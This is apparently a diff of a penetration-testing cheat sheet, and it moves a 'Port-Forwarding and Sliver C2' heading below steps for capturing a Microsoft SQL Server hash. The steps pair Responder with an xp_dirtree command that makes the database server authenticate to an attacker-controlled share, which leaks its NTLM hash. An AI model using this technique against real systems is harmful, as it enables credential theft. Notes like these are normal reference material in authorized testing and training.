@@ -739,17 +739,18 @@ c:\path\to\mysql.exe -u username -p password -e 'show databases;'
 
 Catch hash from `Microsoft SQL Server 2019` method if reverse is not able to do
 
-[[forwarding]]
-== Port-Forwarding and Sliver C2
-
-If some services is runned at `localhost` to enumerate this
-
 1.Start responder
 2.Send a request from `database` to `local` machine
 
 ```bash
 EXEC master .. xp_dirtree '\\<local_machine>\Share'
 ```
+
+[[forwarding]]
+== Port-Forwarding and Sliver C2
+
+If some services is runned at `localhost` to enumerate this
+
 
 ```bash
 netstat -ano
